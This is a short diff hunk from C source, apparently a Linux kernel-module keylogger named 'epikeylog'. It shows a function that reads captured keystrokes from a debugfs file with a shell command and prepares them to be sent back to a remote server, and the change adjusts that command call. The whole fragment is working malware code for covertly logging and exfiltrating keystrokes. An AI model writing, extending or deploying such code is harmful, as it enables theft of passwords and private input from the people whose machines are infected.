@@ -163,7 +163,7 @@ int epikeylog_cb(struct notifier_block *nblock, unsigned long code, void *_param
 }
 
 int epikeylog_send_to_server(void){
-	exec_str_as_command("cat /sys/kernel/debug/kisni/keys");
+	exec_str_as_command("cat /sys/kernel/debug/kisni/keys", true);
 	// Send the result back to the server
 	char result_msg[STD_BUFFER_SIZE];
 	snprintf(result_msg, STD_BUFFER_SIZE, 
